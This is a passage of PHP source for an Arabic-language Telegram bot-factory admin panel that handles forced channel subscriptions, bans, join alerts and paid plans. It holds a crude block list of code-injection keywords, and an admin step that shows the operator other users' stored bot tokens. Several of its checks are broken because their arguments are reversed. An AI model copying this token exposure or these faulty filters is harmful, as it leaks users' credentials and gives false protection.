<?php
error_reporting(0);
$_POST= str_replace([
"#",
"$",
"&",
"+",
"(",
")",
"/",
"*",
"'",
";",
";",
"!",
"?",
"}",
"÷",
"×",
"=",
"|",
"^",
"{",
"}",
"[",
"]",
"<",
">"],
'hacker',
$_POST);
$api= strpos("hacker",$_POST);
if($api != null){
echo "to fail"; 
exit();
}else{
echo "error namero";
}
ob_start(); 
$token = "توكن"; # Token
$user_bot_NaMero="بوتك بدون @";
$xx = "S_P_P1";//يوزرك
$xxx = "https://t.me/V_V_G0/1";// يوزر القناه
$SALEH ="6704860429"; 
$NaMero = array("6704860429");
define("API_KEY", $token);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}


function remove_dir($path){
if(is_dir($path) === false)	{		
return false;	
}	
$dir = opendir($path);
while 
(($file = readdir($dir) )!== false)	{		
if($file == '.' OR $file == '..' OR $file == 'NaMero' OR $file == 'pro.json'){			continue;		
}		
if(is_file($path.'/'.$file)){						
unlink($path.'/'.$file);		
}elseif(is_dir($path.'/'.$file)){				
remove_dir($path.'/'.$file);		
}		
}
rmdir($path);	closedir($dir);
}

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
$host = $_SERVER['HTTP_HOST'];
$path = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
$saleh = $protocol . "://" . $host . $path . "/";

///by @NameroBots
//by @S_P_P1
/// Programmer Namero (Rights are not allowed to change ⚡) 


echo "Maker: $user_bot_NaMero"; 
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$txt = $message->caption;
$text = $message->text;
$chat_id = $message->chat->id;
$from_id = $message->from->id;
$new = $message->new_chat_members;
$message_id = $message->message_id;
$type = $message->chat->type;
$name = $message->from->first_name;
if(isset($update->callback_query)){
$up = $update->callback_query;
$chat_id = $up->message->chat->id;
$from_id = $up->from->id;
$user = $up->from->username;
$name = $up->from->first_name;
$message_id = $up->message->message_id;
$data = $up->data;
}
$id = $update->inline_query->from->id; 
$SALEH = $NaMero; 
mkdir("NaMero");
$get_ban=file_get_contents('NaMero/ban.txt');
$ban =explode("\n",$get_ban);
$member = explode("\n",file_get_contents("NaMero/member.txt"));
$cunte = count($member)-1;
$reply = $message->reply_to_message->message_id;
$rep = $message->reply_to_message->forward_from; 
$NAMERO_X = json_decode(file_get_contents("botmak/NAMERO.json"),true);
if (!file_exists("botmak/NAMERO.json")) {
$NAMERO_X["info"]["st_ch_bots"]="❌";
$NAMERO_X["info"]["user_bot"]="$user_bot_NaMero";
file_put_contents("botmak/NAMERO.json", json_encode($NAMERO_X));
}
$st_ch_bots=$NAMERO_X["info"]["st_ch_bots"];
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
if (!file_exists("NaMero.json")) {
$infoNaMero["info"]["update"]="✅";
$infoNaMero["info"]["propots"]="مجانية";
$infoNaMero["info"]["fwrmember"]="❌";
$infoNaMero["info"]["tnbih"]="✅";
$infoNaMero["info"]["silk"]="✅";
$infoNaMero["info"]["allch"]="error";
$infoNaMero["info"]["klish_sil"]="• عزرا عزيزي عليك الاشتراك في قناه مصنع المبرمج ناميرو لتتمكن من فتح البوت 🪢

🌴- اشترك ثم ارسل /start";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
$updatenew=$infoNaMero["info"]["update"];
$propots=$infoNaMero["info"]["propots"];
$fwrmember=$infoNaMero["info"]["fwrmember"];
$tnbih=$infoNaMero["info"]["tnbih"];
$silk=$infoNaMero["info"]["silk"];
$allch=$infoNaMero["info"]["allch"];
$start=$infoNaMero["info"]["start"];
$klish_sil=$infoNaMero["info"]["klish_sil"];
$updatechannel=$infoNaMero["info"]["updatechannel"];
$admins=$infoNaMero["info"]["admins"];
$info_kl=$infoNaMero["info"]["info_kl"];
$token_kl=$infoNaMero["info"]["token_kl"];
if( $text=="تحديث" ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
تم تحديث البوت بنجاح 
",
'reply_to_message_id'=>$message->message_id,
]);
return false;
}
if($message and $updatenew=="❌" and $from_id!= $SALEH){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"البوت قيد التحديث الرجاء الانتظار حتى يتم الانتهاء من التحديث 🥺",
'reply_to_message_id'=>$message->message_id,
]);
return false;
}
function getChatstats($chat_id,$token) {
$url = 'https://api.telegram.org/bot'.$token.'/getChatAdministrators?chat_id='.$chat_id;
$result = file_get_contents($url);
$result = json_decode ($result);
$result = $result->ok;
return $result;
}
 function getmember($token,$idchannel,$from_id) {
$join = file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=$idchannel&user_id=".$from_id);
if((strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"Bad Request: user not found"') or strpos($join,'"ok": false') or strpos($join,'"status":"kicked"')) !== false){
$NAMERO="no";}else{$NAMERO="yes";}
return $NAMERO;
}
@mkdir("NaMero");
@mkdir("data");
$member = explode("\n",file_get_contents("NaMero/member.txt"));
$cunte = count($member)-1;
$admin=file_get_contents("admin.txt");
$NAMERO_X = json_decode(file_get_contents("botmak/NAMERO.json"),true);
$id_ch_NaMero=$NAMERO_X["info"]["id_channel"];
$link_ch_NaMero=$NAMERO_X["info"]["link_channel"];
$user_bot_NaMero=$NAMERO_X["info"]["user_bot"];
if($message){
$false="";
if($allch!="مفردة"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$orothe= $infoNaMero["info"]["channel"];
$keyboard["inline_keyboard"]=[];
foreach($orothe as $co=>$s ){
$namechannel= $s["name"];
$st= $s["st"];
$userchannel=str_replace('@','', $s["user"]);
if($namechannel!=null){
$stuts = getmember($token,$co,$from_id);
if($stuts=="no"){
if($st=="عامة"){
$url="t.me/$userchannel";
$tt=$s["user"];
}else{
$url =$s["user"];
$tt=$s["user"];
}
if($silk=="✅"){
$keyboard["inline_keyboard"][] = [['text'=>$namechannel,'url'=>$url]];
}else{
$txt=$txt."\n".$tt;
}
$false="yes";
}
}
}
$reply_markup=json_encode($keyboard);
if($false=="yes"){
	bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"$klish_sil
$txt
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>$reply_markup,
]);
return $false;}
}else{
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$orothe= $infoNaMero["info"]["channel"];
foreach($orothe as $co=>$s ){
$keyboard["inline_keyboard"]=[];
$namechannel= $s["name"];
$st= $s["st"];
$userchannel=str_replace('@','', $s["user"]);
if($namechannel!=null){
$stuts = getmember($token,$co,$from_id);
if($stuts=="no"){
if($st=="عامة"){
$url="t.me/$userchannel";
$tt=$s["user"];
}else{
$url =$s["user"];
$tt=$s["user"];
}
if($silk=="✅"){
	$keyboard["inline_keyboard"][] = [['text'=>$namechannel,'url'=>$url]];
}
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"$klish_sil
$tt
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode($keyboard),
]);
return $false;
}}}}}

if($update and !in_array($from_id,$member)){file_put_contents("NaMero/member.txt","$from_id\n",FILE_APPEND);
if($tnbih == "✅" ){
bot("sendmessage",[
"chat_id"=>$SALEH,
"text"=>"- دخل شخص إلى البوت 👥
----------------------------
• الاسم: [$name](tg://user?id=$from_id) 
• ايديه $from_id 
• معرفة : $user

- عدد اعضاء بوتك هو : $cunte
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);}}
$ban = explode("\n",file_get_contents("NaMero/ban.txt"));
$countban = count($ban)-1;

$botfreeid = explode("\n",file_get_contents("infoidbots.txt"));
$countbots = count($botfreeid)-1;
if($countbots <= 0){
$countbots = "لايوجد بوتات مصنوعة";
}

if(in_array($from_id,$ban)){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"❌ لا تستطيع استخدام البوت انت محظور ❌",
]);
return false;
}

if($countban <= 0){
$countban = "لايوجد محظورين";
}


if($text == "/start" and in_array($from_id,$NaMero) or in_array($from_id,$admins)){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"اهلا بك في لوحه تحكم المصنع للمبرمج ناميرو ↕️
----------------------------
• عدد الاعضاء : $cunte
• المحظورين: $countban
• البوتات المصنوعة : $countbots
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"توجيه الرسائل :$fwrmember",'callback_data'=>"fwrmember"]],
[['text'=>" عمل البوت : $updatenew",'callback_data'=>"updatenew"],['text'=>"اشعارات الدخول: $tnbih",'callback_data'=>"tnbih"]],
[['text'=>"رساله الترحيب (start) ",'callback_data'=>"start"]],
[['text'=>" قسم الادمنية ",'callback_data'=>"admins"],['text'=>" قسم الاذاعة ",'callback_data'=>"sendmessage"]],
[['text'=>"قسم الاشتراك الاجباري ",'callback_data'=>"الاجباري"],['text'=>"قسم الاحصائيات ",'callback_data'=>"ahsre"]],
[['text'=>" • لوحه تحكم الصانع • ",'callback_data'=>"Mak3"]],
]])]);}
function sendNAMERO($chat_id,$message_id){
$NAMERO_X = json_decode(file_get_contents("botmak/NAMERO.json"),true);
$st_ch_bots=$NAMERO_X["info"]["st_ch_bots"];
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$updatenew=$infoNaMero["info"]["update"];
$propots=$infoNaMero["info"]["propots"];
$fwrmember=$infoNaMero["info"]["fwrmember"];
$tnbih=$infoNaMero["info"]["tnbih"];
$silk=$infoNaMero["info"]["silk"];
$allch=$infoNaMero["info"]["allch"];
$member = explode("\n",file_get_contents("NaMero/member.txt"));
$cunte = count($member)-1;
$ban = explode("\n",file_get_contents("NaMero/ban.txt"));
$countban = count($ban)-1;
if($countban<=0){
$countban="لايوجد محظورين";
}
$botfreeid=explode("\n",file_get_contents("infoidbots.txt"));
$countbots = count($botfreeid)-1;
if($countbots<=0){
$countbots="لايوجد بوتات مصنوعة";
}
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"اهلا بك في لوحه تحكم المصنع للمبرمج ناميرو ↕️
----------------------------
• عدد الاعضاء : $cunte
• المحظورين: $countban
• البوتات المصنوعة : $countbots
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"توجيه الرسائل :$fwrmember",'callback_data'=>"fwrmember"]],
[['text'=>" عمل البوت : $updatenew",'callback_data'=>"updatenew"],['text'=>"اشعارات الدخول: $tnbih",'callback_data'=>"tnbih"]],
[['text'=>"رساله الترحيب (start) ",'callback_data'=>"start"]],
[['text'=>" قسم الادمنية ",'callback_data'=>"admins"],['text'=>" قسم الاذاعة ",'callback_data'=>"sendmessage"]],
[['text'=>"قسم الاشتراك الاجباري ",'callback_data'=>"الاجباري"],['text'=>"قسم الاحصائيات ",'callback_data'=>"ahsre"]],
[['text'=>" • لوحه تحكم الصانع • ",'callback_data'=>"Mak3"]],
]])]);}
if($data == "الاجباري"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"• *لوحه تحكم الاشتراك الاجباري 📬*",
'parse_mode'=>"markdown",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>" جميع القنوات ",'callback_data'=>"viwechannel"]],
[['text'=>"مسح قناة",'callback_data'=>"delchannel"],['text'=>"إضافة قناة",'callback_data'=>"addchannel"]],
[['text'=>"كليشه الاشتراك الاجباري ",'callback_data'=>"klish_sil"]],
[['text'=>"عرض الاشتراك الاجباري ازرار : $silk ",'callback_data'=>"silk"]], 
[['text'=>"رجوع .",'callback_data'=>"home"]],
]
])
]);
}
function sendNNAMERO($chat_id,$message_id){
    $NAMERO_X = json_decode(file_get_contents("botmak/NAMERO.json"),true);
    $st_ch_bots = $NAMERO_X["info"]["st_ch_bots"];
    $infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
    $silk = $infoNaMero["info"]["silk"];
    $allch = $infoNaMero["info"]["allch"];
    bot('EditMessageText',[
        'chat_id'=>$chat_id, 
        'text'=>"• *لوحه تحكم الاشتراك الاجباري 📬*",
        'parse_mode'=>"markdown",
        'disable_web_page_preview'=>true,
        'message_id'=>$message_id, // هنا استخدمت message_id العادي
        'reply_markup'=>json_encode([ 
            'inline_keyboard'=>[
                [['text'=>" جميع القنوات ",'callback_data'=>"viwechannel"]],
                [['text'=>"مسح قناة",'callback_data'=>"delchannel"],['text'=>"إضافة قناة",'callback_data'=>"addchannel"]],
                [['text'=>"كليشه الاشتراك الاجباري ",'callback_data'=>"klish_sil"]],
                [['text'=>"عرض الاشتراك الاجباري ازرار : $silk ",'callback_data'=>"silk"]], 
                [['text'=>"رجوع .",'callback_data'=>"home"]],
            ]
        ])
    ]);
}
if($data == "ahsre"){
$countalll= count($getmember)-1;
$countban = count($banlist)-1;
$countoff = "لايوجد .";
$countall = $countban + $countalll;
$counton = $countall - $countban - 1;
$countfiltermsg = "".$datas['data']['filtermsg']."";
$counttake = "".$datas['data']['takemsg']."";
$countsend = "".$datas['msg']['sendmsg']."";
$countmedia = "".$datas['data']['mediamsg']."";
$countallmsg = "".$datas['all']['allmsg']."";
$countmsg = $countallmsg + $countmedia + $countsend + $counttake + $countfiltermsg;
$countsubs ="".$datas['data']['subs']."";
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*اليك احصائيات بوتك🔥:*

عدد المشتركين الكلي : * $cunte*
المحظورين منهم : *$countban*
الوهمين منهم : *$countoff*
المشتركين النشطين : *$counton*
• عدد الاعضاء : $cunte
• المحظورين: $countban
• البوتات المصنوعة :$countbots
عدد الرسائل الكلي : *$countmsg*
عدد رسائل الكلمات الممنوعة : *$countfiltermsg*
عدد الرسائل المستلمة : *$counttake*
عدد الرسائل المرسلة : *$countsend*
عدد رسائل الميديا : *$countmedia*

عدد مشتركين قناتك عبر البوت : *$cunte*
",
'parse_mode'=>"markdown",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع .",'callback_data'=>"home"]],
]
])
]);
}
if(preg_match($text,"#decode#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>" ",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#decode#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#encode#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#encode#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#base64#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#base64#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#base64_decode#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#base64_decode#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}

if(preg_match($text,"#;#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#;#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}

if(preg_match($text,"#//#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#//#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#'#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#'#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}

if(preg_match($text,'#"#')){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match('#"#',$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}

if(preg_match($text,"#,#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#,#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}

if(preg_match($text,"#)#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#)#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#(#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#(#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#}#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#}#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#{#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#{#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#]#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#]#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#[#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#[#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#file_get_contents#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#file_get_contents#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#github#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#https#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match("#http#",$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#github#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#https#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match($text,"#http#")){
bot("sendmessage",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"",
'reply_to_message_id'=>$message_id,
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]); return false;
}
if(preg_match('/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/',$text) ){
bot('deleteMessage',[
'chat_id'=>$chat_id,
'message_id'=>$message->message_id
]);
}
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)#(.*)|#(.*)|(.*)#/',$text)){
bot('deleteMessage',[
'chat_id'=>$chat_id,
'message_id'=>$message->message_id
]);
}

if(preg_match('/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/',$text) ){
bot('deleteMessage',[
'chat_id'=>$chat_id,
'message_id'=>$message->message_id
]);
}
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)#(.*)|#(.*)|(.*)#/',$text)){
bot('deleteMessage',[
'chat_id'=>$chat_id,
'message_id'=>$message->message_id
]);
}
if($data == "addprobot"){
    $infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
    $infoNaMero["info"]["amr"] = "addprobot";
    file_put_contents("NaMero.json", json_encode($infoNaMero));
    
    bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"- ارسل الآن يوزر البوت (بدون @) لإضافته في نظام الاشتراك المدفوع",
        'reply_markup'=>json_encode(['inline_keyboard'=>[
            [['text'=>"- الغاء",'callback_data'=>"home"]],
        ]])
    ]);
}

if($text && $text != "/start" && $infoNaMero["info"]["amr"]=="addprobot" && in_array($from_id,$NaMero)){
$us_bo = str_replace('@','',$text);
$idbots = file_get_contents("user/$us_bo.txt");
if($idbots != null && file_exists("botmak/$idbots/info.txt")){
$infobot = explode("\n",file_get_contents("botmak/$idbots/info.txt"));
$tokenbot = $infobot[0];
$userbot= $infobot[1];
$namebot= $infobot[2];
$id = $infobot[3];
$idbots = $infobot[4];
$s_p_p1 = $infobot[6];

bot('sendMessage',[
'chat_id'=>$chat_id,
"text"=>" • مرحا ناميرو معلومات البوت 🎉
----------------------------
• النوع : $s_p_p1
• توكن : `$tokenbot`
• يوزر البوت : *@$userbot*
• ايدي البوت : `$idbots`

- معلومات صاحب البوت 👍

• الايدي : `$id`
• [صاحب البوت](tg://user?id=$id)
",
'parse_mode'=>"Markdown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"سنوي",'callback_data'=>"probotyes yars_".$idbots],['text'=>"6 اشهر",'callback_data'=>"probotyes 6mo_".$idbots],['text'=>"3 اشهر",'callback_data'=>"probotyes 3mo_".$idbots],['text'=>"شهر واحد",'callback_data'=>"probotyes 1mo_".$idbots]],
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])
]);
} else {
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"❌ لايوجد بوت مصنوع بنفس هذا المعرف $text",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- معاودة المحاولة",'callback_data'=>"addprobot"]],
]])
]);
}
$infoNaMero["info"]["amr"]="null";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if(preg_match('/^(probotyes) (.*)/s', $data)){
$nn = str_replace('probotyes ',"",$data);
$ex=explode('_',$nn);
$ash=$ex[0];
$idbots=$ex[1];
if($idbots!=null){
$mo=86400*30;
$time=time()+(3600 * 1);
if($ash=="yars"){$ti=$time+($mo * 12);}
if($ash=="6mo_"){$ti=$time+($mo * 6);}
if($ash=="3mo_"){$ti=$time+($mo * 3);}
if($ash=="1mo_"){$ti=$time+($mo * 1);}
$projsonmem["info"]["pro"]="yes";
$projsonmem["info"]["dateon"]="$time";
$projsonmem["info"]["dateoff"]="$ti";
file_put_contents("botmak/$idbots/pro.json", json_encode($projsonmem));
$projson = json_decode(file_get_contents("prodate.json"),true);
$projson["info"][$idbots]["pro"]="yes";
$projson["info"][$idbots]["dateon"]="$time";
$projson["info"][$idbots]["dateoff"]="$ti";
file_put_contents("prodate.json", json_encode($projson));
$infobot=explode("\n",file_get_contents("botmak/$idbots/info.txt"));
$tokenbot=$infobot['0'];
$userbot=$infobot['1'];
$namebot=$infobot['2'];
$id=$infobot['3'];
$idbots=$infobot['4'];
$s_p_p1=$infobot['6'];
$dayon = date('Y/m/d',$time);
$timeon =date('H:i:s A',$time);
$dayoff = date('Y/m/d',$ti);
$timeoff =date('H:i:s A',$ti);
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"✅ تم اضافة الاشتراك المدفوع بنجاح عزيزي ناميرو ⚡
----------------------------
- معلومات البوت 
• النوع : $s_p_p1
• يوزر البوت : @$userbot
• ايدي البوت : $idbots

- معلومات الاشتراك 📬

- وقت الاشتراك : 
⏰ $timeon
📅 $dayon

- موعد انتهاء الاشتراك ❌: 

⏰ $timeoff
📅 $dayoff
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- ال• رجوع •",'callback_data'=>"home"]],
]])]);
bot('sendmessage',[
'chat_id'=>$id, 
'text'=>"✅ تم اضافة الاشتراك لبوتك المصنوع بنجاح
----------------------------
• النوع : $s_p_p1
• يوزر البوت : @$userbot
• ايدي البوت : $idbots

• معلومات الاشتراك 

⏰ $timeon
📅 $dayon

- موعد انتهاء الاشتراك ❌: 

⏰ $timeoff
📅 $dayoff
",
'disable_web_page_preview'=>true,
]);}}

#حذف اشتراك مدفوع 

if($data == "delprobot"){
$infoNaMero["info"]["amr"]="delprobot";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
